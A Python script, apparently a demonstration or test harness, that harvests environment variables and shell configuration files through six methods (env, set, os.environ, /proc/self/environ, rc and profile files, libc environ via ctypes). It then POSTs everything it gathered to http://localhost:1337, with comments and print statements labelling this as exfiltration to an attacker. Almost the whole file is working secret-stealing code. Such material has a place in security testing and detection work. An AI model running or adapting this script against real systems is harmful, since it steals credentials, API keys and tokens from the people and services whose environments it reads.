#!/usr/bin/python3

import os
import ctypes
from subprocess import check_output
from pathlib import Path
import multiprocessing as mp
from urllib import request, parse

def steal_env():
    """Stealing via env command"""
    return check_output(['env'])

def steal_set():
    """Stealing with shell's built-in set"""
    return check_output(['sh', '-c', 'set'])

def steal_python_environ():
    """Stealing via Python's API."""
    return os.environ

def steal_proc():
    """Stealing from /proc , self pid"""
    env = Path('/proc') / str(os.getpid()) / 'environ'
    if env.is_file():
        return env.read_text()
    return None

def steal_from_common_env_files():
    envs = []
    """Common files that has env vars."""
    commons = {
        '/etc/environment', '/etc/profile', '/etc/bashrc',
        '~/.bash_profile', '~/.bashrc', '~/.profile',
        '~/.cshrc', '~/.zshrc', '~/.tcshrc',
    }
    for i in commons:
        exp = Path(i).expanduser()
        if exp.is_file():
            envs.append(exp.read_text())
    return ''.join(envs)


def libc_environ(ret):
    """Stealing via libc.environ()."""
    libc = ctypes.CDLL(None)
    environ = ctypes.POINTER(ctypes.c_char_p).in_dll(libc, 'environ')
    for var in environ:
        if var:
            ret[var] = 1

def steal_libc():
    """libc.environ() can throw segfault."""
    # See: https://stackoverflow.com/a/9062779/2927282
    manager = mp.Manager()
    ret = manager.dict()
    worker = mp.Process(target=libc_environ, args=(ret,))
    worker.start()
    worker.join()
    if worker.exitcode < 0:
        # Skip segfault
        pass
    return ret.keys()


def main():
    env = []
    try:
        env.append(steal_env())
        print('stealing from env')
    except Exception:
        pass
    try:
        env.append(steal_set())
        print('stealing from set')
    except Exception:
        pass
    try:
        env.append(steal_python_environ())
        print('stealing from os.environ')
    except Exception:
        pass
    try:
        env.append(steal_proc())
        print('stealing from proc fs')
    except Exception:
        pass
    try:
        env.append(steal_from_common_env_files())
        print('stealing from common env file')
    except Exception:
        pass
    try:
        env.append(steal_libc())
        print('stealing from libc')
    except Exception:
        pass
    # Send data to attacker
    try:
        print(env)
        data = parse.urlencode({"data":str(env)}).encode()
        req =  request.Request("http://localhost:1337", data=data)
        resp = request.urlopen(req)
        print('Exfiltrating data to attacker')
    except Exception:
        pass
